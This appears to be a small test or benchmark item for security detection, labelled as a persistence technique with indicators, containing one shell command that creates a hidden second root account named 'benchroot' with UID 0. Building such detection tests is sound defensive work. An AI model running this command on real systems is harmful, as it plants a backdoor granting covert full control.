# category: persistence
# title: New account with UID 0
# indicator: benchroot
# indicator: /etc/passwd
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash benchroot
